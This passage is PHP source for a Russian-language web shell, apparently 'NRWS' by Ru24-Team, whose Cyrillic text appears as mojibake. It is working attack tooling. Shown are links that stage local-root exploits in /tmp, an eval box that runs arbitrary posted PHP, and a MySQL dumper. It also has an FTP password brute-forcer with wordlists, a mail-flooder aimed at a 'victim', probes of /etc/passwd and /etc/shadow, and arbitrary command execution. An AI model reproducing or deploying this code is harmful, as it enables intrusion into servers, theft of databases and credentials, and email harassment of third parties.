<a href='?ac=upload&file3=$private_site/sxp&file2=/tmp'>Sendmail 8.11.x exploit localroot (./sxp)</a><br>
<a href='?ac=upload&file3=$private_site/ptrace_kmod&file2=/tmp'>Local Root Unix 2.4.* (./ptrace_kmod)</a><br>
<a href='?ac=upload&file3=$private_site/mr1_a&file2=/tmp'>Local Root Unix 2.4.* (./mr1_a)</a><br><br>";
echo "Èñïîëüçîâàíèå: çàõîäèòå â /tmp èç bash øåëëà è çàïóñêàéòå ôàéëû çàïóñêà.<br>
Ïðèìåð: cd /tmp; ./m - âñå, ýêñïëîèò çàïóñòèòñÿ, è åñëè âñå ok, òî âû ïîëó÷èòå ïðàâà root'a!<br>
Åñëè çäåñü íå îêàçàëîñü ïîäõîäÿùåãî ýêñïëîèòà, òî ïîñåòèòå <a href=http://www.web-hack.ru/exploits/>www.web-hack.ru/exploits/</a> è <a href=http://security.nnov.ru>security.nnov.ru</a>.";

break;
case "damp":

  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  if((!empty($_POST['dif'])&&$fp)||(empty($_POST['dif']))){
  $db = @mysql_connect('localhost',$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {

   if(@mysql_select_db($_POST['mysql_db'],$db))
    {
     // èíôà î äàìïå
     $sql1  = "# MySQL dump created by NRWS\r\n";
     $sql1 .= "# homepage: http://www.Ru24-Team.NET\r\n";
     $sql1 .= "# ---------------------------------\r\n";
     $sql1 .= "#     date : ".date ("j F Y g:i")."\r\n";
     $sql1 .= "# database : ".$_POST['mysql_db']."\r\n";
     $sql1 .= "#    table : ".$_POST['mysql_tbl']."\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     // ïîëó÷àåì òåêñò çàïðîñà ñîçäàíèÿ ñòðóêòóðû òàáëèöû
     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
     $row   = @mysql_fetch_row($res);
     $sql1 .= $row[1]."\r\n\r\n";
     $sql1 .= "# ---------------------------------\r\n\r\n";

     $sql2 = '';

     // ïîëó÷àåì äàííûå òàáëèöû
     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
     if (@mysql_num_rows($res) > 0) {
     while ($row = @mysql_fetch_assoc($res)) {
     $keys = @implode("`, `", @array_keys($row));
     $values = @array_values($row);
     foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
     $values = @implode("', '", $values);
     $sql2 .= "INSERT INTO `".$_POST['mysql_tbl']."` (`".$keys."`) VALUES ('".$values."');\r\n";
     }
     $sql2 .= "\r\n# ---------------------------------";
     }
     echo "<center><b>Ãîòîâî! Äàìï ïðîøåë óäà÷íî!</b></center>";
    // ïèøåì â ôàéë èëè âûâîäèì â áðàóçåð
    if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }
    else { echo $sql1.$sql2; }
    } // end if(@mysql_select_db($_POST['mysql_db'],$db))

    else echo "Òàêîé ÁÄ íåò!";
   @mysql_close($db);
   } // end if($db)
  else echo "Íåò êîííåêòà c ñåðâåðîì!";
 } // end if(($_POST['dif']&&$fp)||(!$_POST['dif'])){
 else if(!empty($_POST['dif'])&&!$fp) { echo "ÎØÈÁÊÀ, íåò ïðàâ çàïèñè â ôàéë!"; }

break;
// SQL Attack
case "sql":
echo "<form name='mysql_dump' action='?ac=damp' method='post'>";
echo "&nbsp;Áàçà: &nbsp;<input type=text name=mysql_db size=15 value=";
echo (!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"));
echo ">";
echo "&nbsp;Òàáëèöà: &nbsp;<input type=text name=mysql_tbl size=15 value=";
echo (!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"));
echo ">";
echo "&nbsp;Ëîãèí: &nbsp;<input type=text name=mysql_l size=15 value=";
echo (!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"));
echo ">";
echo "&nbsp;Ïàðîëü: &nbsp;<input type=text name=mysql_p size=15 value=";
echo (!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"));
echo ">";
echo "<input type=hidden name=dir size=85 value=".$dir.">";
echo "<input type=hidden name=cmd size=85 value=mysql_dump>";
echo "<br>&nbsp;Ñîõðàíèòü äàìï â ôàéëå: <input type=checkbox name=dif value=1 id=dif><input type=text name=dif_name size=85 value=";
echo (!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"));
echo ">";
echo "<input type=submit name=submit value=Ñîõðàíèòü>" ;
echo "</font>";
echo "</form>";
 print "<tr><td>";
###

@$php_self=$_GET['PHP_SELF'];
@$from=$_GET['from'];
@$to=$_GET['to'];
@$adress=$_POST['adress'];
@$port=$_POST['port'];
@$login=$_POST['login'];
@$pass=$_POST['pass'];
@$adress=$_GET['adress'];
@$port=$_GET['port'];
@$login=$_GET['login'];
@$pass=$_GET['pass'];
if(!isset($adress)){$adress="localhost";}
if(!isset($login)){$login="root";}
if(!isset($pass)){$pass="";}
if(!isset($port)){$port="3306";}
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}
?>

<body vLink=white>
<font color=black face=verdana size=1>
<form>  <? if(!@$conn){ ?>
<table><tr><td valign=top>
<input type=hidden name=ac value=sql>
<tr><td valign=top>Õîñò: </tr><td><input name=adress value='<?=$adress?>' size=20></td></tr>
<tr><td valign=top>Ïîðò: </tr><td><input name=port value='<?=$port?>' size=6></td></tr>
<tr><Td valign=top>Ëîãèí: </td><td><input name=login value='<?=$login?>' size=10></td></tr>
<tr><Td valign=top>Ïàðîëü: </td><td> <input name=pass value='<?=$pass?>' size=10>
<input type=hidden name=p value=sql></td></tr>
<tr><td></td><td><input type=submit name=conn value=Ïîäêëþ÷èòüñÿ></form></td></tr><?}?>
<tr><td valign=top><? if(@$conn){ echo "<b>PHP v".@phpversion()."<br>mySQL v".@mysql_get_server_info()."<br>";}?></b></td><td>
</td></tr>
</table>
<table width=100%><tr><td>
<?
@$conn=$_GET['conn'];
@$adress=$_GET['adress'];
@$port=$_GET['port'];
@$login=$_GET['login'];
@$pass=$_GET['pass'];
if($conn){

$serv = @mysql_connect("$adress:$port", "$login", "$pass") or die("ÎØÈÁÊÀ: ".mysql_error());
if($serv){$status="Ïîäêëþ÷åí. :: <a href='$php_self?conn=0'>Âûéòè èç áàçû</a>";}else{$status="Îòêëþ÷åí.";}
print "<b><font color=green>Ñòàòóñ: $status<br><br>";
print "<table cellpadding=0 cellspacing=0><tr><td valign=top>";
print "<font color=red>[Òàáëèöû]</font><Br><font color=white>";
$res = mysql_list_dbs($serv);
while ($str=mysql_fetch_row($res)){
print "<b><a href='$php_self?ac=sql&base=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a></b><br>";
@$tc++;
}
$pro="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
@$base=$_GET['base'];
@$db=$_GET['db'];
print "<font color=red>[Âñåãî òàáëèö: $tc]</font><br>$pro";
if($base){
print "<div align=left><font color=green>Òàáëèöà: [$tbl]</div></font><br>";
$result=mysql_list_tables($db);
while($str=mysql_fetch_array($result)){
$c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
$records=mysql_fetch_array($c);
print "<font color=red>[$records[0]]</font> <a href='$php_self?ac=sql&inside=1&p=sql&vn=$str[0]&base=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>";
mysql_free_result($c);
}
} #end base

@$vn=$_GET['vn'];
print "</td><td valign=top>";
print "<font color=green>Áàçà äàííûõ: $db => $vn</font>";
@$inside=$_GET['inside'];
@$tbl=$_GET['tbl'];
if($inside){
print "<table cellpadding=0 cellspacing=1><tr>";

mysql_select_db($db) or die(mysql_error());
$c=mysql_query ("SELECT COUNT(*) FROM $tbl");
$cfa=mysql_fetch_array($c);
mysql_free_result($c);
print "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>";
print "
Âñåãî: $cfa[0]<form>
<input type=hidden name=ac value=sql>
Îò: <input name=from size=3 value=0>
Äî: <input name=to size=3 value=$cfa[0]>
<input type=submit name=show value=Ïîêàçàòü>
<input type=hidden name=inside value=1>
<input type=hidden name=vn value=$vn>
<input type=hidden name=db value=$db>
<input type=hidden name=login value=$login>
<input type=hidden name=pass value=$pass>
<input type=hidden name=adress value=$adress>
<input type=hidden name=conn value=1>
<input type=hidden name=base value=1>
<input type=hidden name=p value=sql>
<input type=hidden name=tbl value=$tbl>
 [<a href='$php_self?ac=sql&getdb=1&to=$cfa[0]&inside=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&base=1&p=sql&tbl=$tbl'>Çàãðóçèòü</a>]
</form>";
@$vn=$_GET['vn'];
@$from=$_GET['from'];
@$to=$_GET['to'];
@$from=$_GET['from'];
@$to=$_GET['to'];
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}
$query = "SELECT * FROM $vn LIMIT $from,$to";
$result = mysql_query($query);
for ($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
print "<td>&nbsp;</td><td bgcolor=#BCE0FF> $name </td> ";
}
print "</tr>";
while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
print "<tr>";
foreach ($mn as $come=>$lee) {
$nst_inside=htmlspecialchars($lee);
print "<td>&nbsp;</td><td bgcolor=silver>$nst_inside</td>\r\n";
} print "</tr>";
}
mysql_free_result($result);
print "</table>";

} #end inside
print "</td></tr></table>";
} # end $conn


###   end of sql
print "</tr></td></table> </td></tr></table>";
print $copyr;
die;


break;

//PHP Eval Code execution
case "eval":

echo <<<HTML
<b>Èñïîëíåíèå php-êîäà (áåç "< ?  ? >")</b>
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="eval">
<tr>
<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Enter"></td>
$tend
HTML;

if (isset($_POST['ephp'])){
eval($_POST['ephp']);
}
break;

// SEND MAIL
case "sendmail":
echo <<<HTML
<table>
<form method="POST" action="$self">
<input type="hidden" name="ac" value="sendmail">
<tr>Îò êîãî: <br>
<input type="TEXT" name="frommail">
<br>Êîìó:<br> <input type="TEXT" name="tomailz">
<br>Òåìà: <br><input type="TEXT" name="mailtema">
<br>Òåêñò: <br>
<td><textarea name="mailtext" rows="10" cols="60"></textarea></td>
</tr>
<tr>
<td><input type="submit" value="Îòïðàâèòü" name="submit"></td><form>
$tend
HTML;
// íèêàêàÿ ïðîâåðêà íå äåëàåòñÿ, à çà÷åì ? =)
if (isset($submit))
{

mail($tomailz,$mailtema,$mailtext,"From: $frommail");
echo "<h2>Ñîîáùåíèå îòïðàâëåíî!</h2>";
}
break;


// Èíôîðìàöèÿ î ñèñòåìå
case "info":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">Âêëþ÷åíî</font>";
}
else {$safemode = false; $hsafemode = "Îòêëþ÷åíî</font>";}
/* display information */
echo "<b>[ Èíôîðìàöèÿ î ñèñòåìå ]</b><br>";
echo "<b>Õîñò:</b> ".$_SERVER["HTTP_HOST"]."<br>" ;
echo "<b>IP ñåðâåðà:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>";
echo " <b>Ñåðâåð: </b>".$_SERVER['SERVER_SIGNATURE']."  ";
echo "<b>OC:</b> ".exec("uname -a")."(";
print "".php_uname()." )<br>\n";
echo "<b>Ïðîöåññîð:</b> ".exec("cat /proc/cpuinfo | grep GHz")."<br>";
echo "<b>Ïðèâèëåãèè: </b>".exec("id")."<br>";
echo "<b>Âñåãî ìåñòà: </b>" . (int)(disk_total_space(getcwd())/(1024*1024)) . " MB " . "<b>Ñâîáîäíî</b>: " . (int)(disk_free_space(getcwd())/(1024*1024)) . " MB <br>";
echo "<b>Òåêóùèé êàòàëîã:</b>".exec("pwd")."";
echo " <br><b>Òåêóøèé web-ïóòü: </b>".@$_SERVER['PHP_SELF']."  ";
echo "<br><b>Òâîé IP:</b> ".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")<br>";
echo "<b>PHP version: </b>".phpversion()."<BR>";
echo "<b> ID âëàäåëüöà ïðîöåñà: </b>".get_current_user()."<BR>";
echo "<b>MySQL</b> : ".mysql_get_server_info()."<BR>";
if(file_exists('/etc/passwd') && is_readable('/etc/passwd')){
print '<b>Åñòü äîñòóï ê /etc/passwd! </b><br>';
}
if(file_exists('/etc/shadow') && is_readable('/etc/shadow')){
print '<b>Åñòü äîñòóï ê /etc/shadow!</b> <br>';
}
if(file_exists('/etc/shadow-') && is_readable('/etc/shadow-')){
print '<b>Åñòü äîñòóï ê /etc/shadow-!</b> ';
}
if(file_exists('/etc/master.passwd') && is_readable('/etc/master.passwd')){
print '<b>Åñòü äîñòóï ê /etc/master.passwd! </b><br>';
}
if(isset($_POST['th']) && $_POST['th']!=''){
chdir($_POST['th']);
};
if(is_writable('/tmp/')){
$fp=fopen('/tmp/qq8',"w+");
fclose($fp);
print "/tmp - îòêðûòà&nbsp;<br>\n";
unlink('/tmp/qq8');
}
else{
print "<font color=red>/tmp - íå îòêðûòà</font><br>";
}
echo "<b>Áåçîïàñíûé ðåæèì: ".$hsafemode."</b><br>";
if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   $num = $nixpasswd + $nixpwdperpage;
   echo "<b>*nix /etc/passwd:</b><br>";
   $i = $nixpasswd;
   while ($i < $num)
   {
    $uid = posix_getpwuid($i);
    if ($uid) {echo join(":",$uid)."<br>";}
    $i++;
   }
  }
  else {echo "<br><a href=?ac=navigation&d=/etc/&e=passwd><b><u>Get /etc/passwd</u></b></a><br>";}
  if (file_get_contents("/etc/userdomains")) {echo "<b><a href=\"".$surl."act=f&f=userdomains&d=/etc/&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></b><br>";}
  if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><a href=\"".$surl."act=f&f=accounting.log&d=/var/cpanel/&ft=txt\"><u><b>View cpanel logs</b></u></a></b><br>";}
  if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/usr/local/apache/conf&e=httpd.conf><u><b>Êîíôèãóðàöèÿ Apache (httpd.conf)</b></u></a></b><br>";}
  { echo "<b><a href=?ac=navigation&d=/etc/httpd/conf&e=httpd.conf><u><b>Êîíôèãóðàöèÿ Apache (httpd.conf)</b></u></a></b><br>";}
   if (file_get_contents("/etc/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/etc/&e=httpd.conf><u><b>Êîíôèãóðàöèÿ Apache (httpd.conf)</b></u></a></b><br>";}
    if (file_get_contents("/etc/httpd.conf")) {echo "<b><a href=?ac=navigation&d=/var/cpanel&e=accounting.log><u><b>cpanel log  </b></u></a></b><br>";}
 break;

// Î ñêðèïòå
case "about":

echo "<center><b>Ïðèâåò âñåì!</b><br><br>
Íàêîíåö-òî NWRS äîñòóïåí â ïåðâîé ñòàáèëüíîé âåðñèè! Äîáàâèëîñü ìíîæåñòâî íîâûõ ïîëåçíûõ âîçìîæíîñòåé. Âñå ôóíêöèè ñêðèïòà ðàáîòàþò è ðàáîòàþò êîððåêòíî. Äîáàâëåíû óíèêàëüíûå èíñòðóìåíòû äëÿ âçëîìà ñåðâåðà. Â òî æå âðåìÿ íåò íè÷åãî ëèøíåãî. Âñå, ÷òî çàäóìûâàëîñü - ðåàëèçèðîâàíî. Äóìàþ, êàæäûé íàéäåò â ñêðèïòå ÷òî-òî ïîëåçíîå äëÿ ñåáÿ. Òàêæå çàÿâëÿþ î òîì, ÷òî ÿ çàêðûâàþ ïðîåêò, èáî îí äîñòèã èäåàëà :) Ëþáîé ìîæåò åãî ïðîäîëæèòü, php - îòêðûòûé ÿçûê. Íà ïåðâûõ ïîðàõ ñêðèïò âîîáùå áûë òîëüêî ó íåñêîëüêèõ ÷åëîâåê óçêîãî êðóãà äðóçåé, ïèñàë åãî äëÿ ñåáÿ, èç-çà ñâîåé ïðèðîäíîé ëåíè.
Íó, è ñïàñèáî ýòèì ëþäÿì:  Nitrex, Terabyte, 1dt_wolf, xoce, FUF, Shift, dodbob, m0zg, Tristram, Sanchous (îðôîãðàôèÿ è äèçàéí)... È ìíîãèì äðóãèì... Èõ èäåè î÷åíü ïîìîãëè âîïëîòèòü â æèçíü ñòîëü óíèâåðñàëüíûé èíñòðóìåíò. Îãðîìíîå ñïàñèáî èì!<br><br><b>Ïîìíèòå: èñïîëüçóÿ ýòîò ñêðèïò íà ÷óæèõ ñåðâåðàõ, âû íàðóøàåòå çàêîí :) Òàê ÷òî îñòîðîæíåå.</b></center>";
echo "<center><br><br><em>Ïîñåòèòå ýòè ñàéòû, è âû âñåãäà áóäåòå â êóðñå ñîáûòèé:</em><br><br>
<a href='http://www.ru24-team.net'>www.ru24-team.net</a><br><br>
<a href='http://www.web-hack.ru'>www.web-hack.ru</a><br><br>
<a href='http://www.rst.void.ru'>www.rst.void.ru</a><br><br>
<a href='http://www.hackru.info'>www.hackru.info</a><br><br>
<a href='http://www.realcoding.net'>www.realcoding.net</a><br><br>
<a href='http://www.ccteam.ru'>www.ccteam.ru</a><br><br>
Èçâèíÿþñü, åñëè êîãî çàáûë.<br> <em>Àâòîð íå íåñåò îòâåòñòâåííîñòè çà ìàòåðèàëû, ðàçìåùåííûå íà ýòèõ ñàéòàõ, îcîáåííî íà ïîñëåäíåì </em>:)
<br><br><br><br><br><b>Ñêðèïò ðàñïðîñòðàíÿåòñÿ ïî ëèöåíçèè GNU GPL<br> 22 Èþëÿ 2005 ã. © DreAmeRz<br> e-mail:</b> <a href='mailto:dreamerz@mail.ru'>dreamerz@mail.ru</a><b> ICQ: </b>817312 <b>WEB: </b><a href='http://www.ru24-team.net'>http://www.Ru24-Team.NET</a>";
break;

// ÔÒÏ ïîäáîð ïàðîëåé
case "ftppass":

$filename="/etc/passwd"; // passwd file
$ftp_server="localhost"; // FTP-server

echo "FTP-server: <b>$ftp_server</b> <br><br>";

$fp = fopen ($filename, "r");
if ($fp)
{
while (!feof ($fp)) {
$buf = fgets($fp, 100);
ereg("^([0-9a-zA-Z]{1,})\:",$buf,$g);
$ftp_user_name=$g[1];
$ftp_user_pass=$g[1];
$conn_id=ftp_connect($ftp_server);
$login_result=@ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);

if (($conn_id) && ($login_result)) {
echo "<b>Ïîäêëþ÷åíèå login:password - ".$ftp_user_name.":".$ftp_user_name."</b><br>";
ftp_close($conn_id);}
else {
echo $ftp_user_name." - error<br>";
}
}}
break;

case "ftp":

echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 width=500 align=center>
 <form action='$PHP_SELF?ac=ftp' method=post><tr><td align=left valign=top colspan=3 class=pagetitle>
 <b><a href=?ac=ftppass>Ïðîâåðèòü íà ñâÿçêó login\password</a></b>
</td></tr>

<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;FTP Host:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='host' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Login:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='login' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Êîëëè÷åñòâî ïàðîëåé:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='number' size=10> <1000 pass </td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Ïàðîëü äëÿ ïðîâåðêè:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='testing' size=50>
<input type='submit' value='Brut FTP' class=button1 $style_button><br><b>Ëîã ñîõðàíÿåòñÿ â pass.txt</b></td></tr>



 </form></table>";


function s() {
   $word="qwrtypsdfghjklzxcvbnm";
   return $word[mt_rand(0,strlen($word)-1)];
}

function g() {
   $word="euioam";
   return $word[mt_rand(0,strlen($word)-2)];
}

function name0() {   return s().g().s();                        }
function name1() {   return s().g().s().g();                    }
function name2() {   return s().g().g().s();                    }
function name3() {   return s().s().g().s().g();                }
function name4() {   return g().s().g().s().g();                }
function name5() {   return g().g().s().g().s();                }
function name6() {   return g().s().s().g().s();                }
function name7() {   return s().g().g().s().g();                }
function name8() {   return s().g().s().g().g();                }
function name9() {   return s().g().s().g().s().g();            }
function name10() {   return s().g().s().s().g().s().s();        }
function name11() {   return s().g().s().s().g().s().s().g();        }

$cool=array(1,2,3,4,5,6,7,8,9,10,99,100,111,111111,666,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005);
$cool2=array('q1w2e3','qwerty','qwerty111111','123456','1234567890','0987654321','asdfg','zxcvbnm','qazwsx','q1e3r4w2','q1r4e3w2','1q2w3e','1q3e2w','poiuytrewq','lkjhgfdsa','mnbvcxz','asdf','root','admin','admin123','lamer123','admin123456','administrator','administrator123','q1w2e3r4t5','root123','microsoft','muther','hacker','hackers','cracker');

function randword() {
   global $cool;
   $func="name".mt_rand(0,11);
   $func2="name".mt_rand(0,11);
   switch (mt_rand(0,11)) {
      case 0: return $func().mt_rand(5,99);
      case 1: return $func()."-".$func2();
      case 2: return $func().$cool[mt_rand(0,count($cool)-1)];
      case 3: return $func()."!".$func();
      case 4: return randpass(mt_rand(5,12));
      default: return $func();
   }


}

function randpass($len) {
   $word="qwertyuiopasdfghjklzxcvbnm1234567890";
   $s="";
   for ($i=0; $i<$len; $i++) {
      $s.=$word[mt_rand(0,strlen($word)-1)];
   }
   return $s;
}
if (@unlink("pass.txt") < 0){
echo "íè÷åãî íåò";
exit;
}
$file="pass.txt";
if($file && $host && $login){
   $cn=mt_rand(30,30);
for ($i=0; $i<$cn; $i++) {
   $s=$cool2[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$s\n");
   }

  $cnt2=mt_rand(43,43);
for ($i=0; $i<$cnt2; $i++) {
   $r=$cool[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$login$r\n");
}
$p="$testing";
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$p\n");

 $cnt3=mt_rand($number,$number);
   for ($i=0; $i<$cnt3; $i++) {
   $u=randword();
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$u\n");
  }

  if(is_file($file)){
 $passwd=file($file,1000);
  for($i=0; $i<count($passwd); $i++){
   $stop=false;
   $password=trim($passwd[$i]);
   $open_ftp=@fsockopen($host,21);
    if($open_ftp!=false){
     fputs($open_ftp,"user $login\n");
     fputs($open_ftp,"pass $password\n");
     while(!feof($open_ftp) && $stop!=true){
      $text=fgets($open_ftp,4096);
      if(preg_match("/230/",$text)){
       $stop=true;
           $f=@fopen($host._ftp,"a+");
       fputs($f,"Enter on ftp:\nFTPhosting:\t$host\nLogin:\t$login\nPassword:\t$password\n ");

       echo "
                   <TABLE CELLPADDING=0 CELLSPACING=0 width=500 align=center>
<tr><td align=center class=pagetitle><b><font color=\"blue\">Ïîçäðàâëÿþ!!! Ïàðîëü ïîäîáðàí.</font></b><br>
&nbsp;&nbsp;Êîííåêò: <b>$host</b><br>&nbsp;&nbsp;Ëîãèí: <b>$login</b><br>&nbsp;&nbsp;Ïàðîëü: <b>$password</b></td></tr></table>
";exit;
      }
      elseif(preg_match("/530/",$text)){
       $stop=true;

      }
     }
     fclose($open_ftp);
   }else{
    echo "
        <TABLE CELLPADDING=0 CELLSPACING=0  width=500 align=center>
<tr><td align=center class=pagetitle bgcolor=#FF0000><b>Íåâåðíî óêàçàí ftp õîñòèíãà!!! Íà <b><u>$host</u></b> çàêðûò 21 ïîðò!</b></b></td></tr>
</table>
";exit;
   }
  }
 }
}


break;
// SQL Attack
case "sql":

break;






// MailFlud
case "mailfluder":

$email=$_POST['email']; // Ìûëî æåðòâû
$from=$_POST['from']; // Ìûëî æåðòâû
$num=$_POST['num']; // ×èñëî ïèñåì
$text=$_POST['text']; // Òåêñò ôëóäà
$kb=$_POST['kb']; // Âåñ ïèñüìà (kb)
?>
<script language="JavaScript"><!--
function reset_form() {
document.forms[0].elements[0].value="";
document.forms[0].elements[1].value="";
document.forms[0].elements[2].value="";
document.forms[0].elements[3].value="";
document.forms[0].elements[4].value="";
}
//--></script>
<?php
if (($email!="" and isset($email)) and ($num!="" and isset($num)) and ($text!="" and isset($text)) and ($kb!="" and isset($kb))) {

$num_text=strlen($text)+1; // Îïðåäåëÿåò äëèíó òåêñòà + 1 (ïðîáåë â êîíöå)
$num_kb=(1024/$num_text)*$kb;
$num_kb=ceil($num_kb);

for ($i=1; $i<=$num_kb; $i++) {
$msg=$msg.$text." ";
}

for ($i=1; $i<=$num; $i++) {
mail($email, $text, $msg, "From: $from");
}

$all_kb=$num*$kb;

echo <<<EOF
<p align="center">Æåðòâà: <b>$email</b><br>
Êîë-âî ïèñåì: <b>$num</b><br>
Îáùèé ïîñëàííûé îáúåì: <b>$all_kb kb</b><br></p>
EOF;

}

else {

echo <<<EOF
<form action="?ac=mailfluder" method="post">
<table align="center" border="0" bordercolor="#000000">
<tr><td>Ìûëî æåðòâû</td><td><input type="text" name="email" value="to@mail.com" size="25"></td></tr>
<tr><td>Îò ëèïîâîãî ìûëà</td><td><input type="text" name="from" value="support@mail.com" size="25"></td></tr>
<tr><td>×èñëî ïèñåì</td><td><input type="text" name="num" value="5" size="25"></td></tr>
<tr><td>Òåêñò ôëóäà</td><td><input type="text" name="text" value="fack fack fack" size="25"></td></tr>
<tr><td>Âåñ ïèñüìà (KB)</td><td><input type="text" name="kb" value="10" size="25"></td></tr>
<tr><td colspan="2" align="center"><input type="submit">&nbsp;&nbsp;<input type="button" onclick="reset_form()" value="Reset"></td></tr>
</table>
</form>
EOF;

}
break;

case "tar":
# àðõèâàöèÿ äèðåêòîðèè
$fullpath = $d."/".$tar;
/* çàäàåì ñëó÷àéíûå èìåíà ôàéëîâ àðõèâàöèè*/
$CHARS = "abcdefghijklmnopqrstuvwxyz";
for ($i=0; $i<6; $i++)  $charsname .= $CHARS[rand(0,strlen($CHARS)-1)];
 echo "<br>
Êàòàëîã <u><b>$fullpath</b></u>  ".exec("tar -zc $fullpath -f $charsname.tar.gz")."óïàêîâàí â ôàéë <u>$charsname.tar.gz</u>";



echo "

<form action='?ac=tar' method='post'>
<tr><td align=center colspan=2 class=pagetitle><b>Àðõèâàöèÿ <u>$name.tar.gz</u>:</b></td></tr>
<tr>
<td valign=top><input type=text name=archive size=90 class='inputbox'value='tar -zc /home/$name$http_public -f $name.tar.gz' ></td>
<td valign=top><input type=submit value='Íà÷àòü'></td>
</tr></form>";

exec($archive);

break;


// Íàâèãàöèÿ
case "navigation":

 // Ïîøëà íàâèãàöèÿ
$mymenu = " [<a href='$php_self?ac=navigation&d=$d&e=$e'>Ïðîñìîòð </a>] [<a href='$php_self?ac=navigation&d=$d&e=$e&delete=1'>Óäàëèòü</a>] [<a href='$php_self?ac=navigation&d=$d&ef=$e&edit=1'>Ðåäàêòèðîâàòü</a>] [<a href='$php_self?ac=navigation&d=$d&e=$e&clean=1'>Î÷èñòèòü</a>] [<a href='$php_self?ac=navigation&d=$d&e=$e&replace=1'>Çàìåíèòü òåêñò</a>] [<a href='$php_self?ac=navigation&d=$d&download=$e'>Çàãðóçèòü</a>]<br>";
if(@$_GET['download']){
@$download=$_GET['download'];
@$d=$_GET['d'];
header("Content-disposition: attachment; filename=\"$download\";");
readfile("$d/$download");
exit;}
$images=array(".gif",".jpg",".png",".bmp",".jpeg");
$whereme=getcwd();
@$d=@$_GET['d'];
$copyr = "<center>";
$php_self=@$_SERVER['PHP_SELF'];
if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
if(!isset($d)){$d=$whereme;}
$d=str_replace("\\","/",$d);



$expl=explode("/",$d);
$coun=count($expl);
if($os=="unix"){echo "<a href='$php_self?ac=navigation&d=/'>/</a>";}
else{
        echo "<a href='$php_self?ac=navigation&d=$expl[0]'>$expl[0]/</a>";}
for($i=1; $i<$coun; $i++){
        @$xx.=$expl[$i]."/";
$sls="<a href='$php_self?ac=navigation&d=$expl[0]/$xx'>$expl[$i]</a>/";
$sls=str_replace("//","/",$sls);
$sls=str_replace("/'></a>/","/'></a>",$sls);
print $sls;
}
echo "</td></tr>";
//if($os=="unix"){ echo "
//<tr><td><b>id:</b> ".@exec('id')."</td></tr>
